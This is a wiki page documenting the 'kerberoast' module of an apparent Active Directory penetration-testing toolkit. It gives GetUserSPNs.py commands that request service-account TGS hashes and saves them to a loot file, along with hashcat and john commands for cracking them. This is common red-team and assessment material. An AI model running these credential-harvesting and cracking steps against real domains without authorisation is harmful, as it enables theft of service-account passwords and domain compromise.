---
tags: [ade, module, kerberoast, tgs, kerberos]
---

# kerberoast

> **Order:** 6 of 12  
> **Auth:** authenticated  
> **Prerequisites:** domain, fqdn, credentials  
> **Tools:** GetUserSPNs.py

Requests TGS tickets for service accounts (Kerberoasting).

## What It Does

1. Runs `GetUserSPNs.py` with `-request` to obtain crackable TGS hashes
2. Parses and saves hashes to [[kerberoast_hashes.txt]]
3. Detects NTLM negotiation failure and triggers Kerberos rerun if needed

```bash
GetUserSPNs.py CORP.LOCAL/user:pass -request -dc-host dc01.corp.local
```

With Kerberos:
```bash
GetUserSPNs.py CORP.LOCAL/user:pass -request -dc-host dc01.corp.local -k
```

## NTLM Failure Detection

If output contains `NTLM negotiation failed` or `invalidCredentials` **and** not already in Kerberos mode:
- Returns `True` to trigger a full Kerberos rerun
- CLI prints `[!] KERBEROS RERUN DETECTED`

If already in Kerberos mode (`-k`), no rerun is triggered.

## Output

Hashes are saved to [[kerberoast_hashes.txt]] with cracking commands:
```
[+] Saved 3 Kerberoast hash(es) to loot/kerberoast_hashes.txt
    hashcat -m 13100 loot/kerberoast_hashes.txt <wordlist>
    john --wordlist=<wordlist> loot/kerberoast_hashes.txt
```

## Hashcat Mode

| Hash Type | Mode |
|-----------|:----:|
| Kerberos TGS | **13100** |

## Related

- [[asrep]] — previous module (also produces kerberoast hashes via no-auth)
- [[kerberoast_hashes.txt]] — hash output
- [[bloodhound]] — next module
- [[Workflows#Kerberos|Kerberos Mode]] — rerun flow
- [[Modules]] — full module list
- [[ADE]] — back to hub
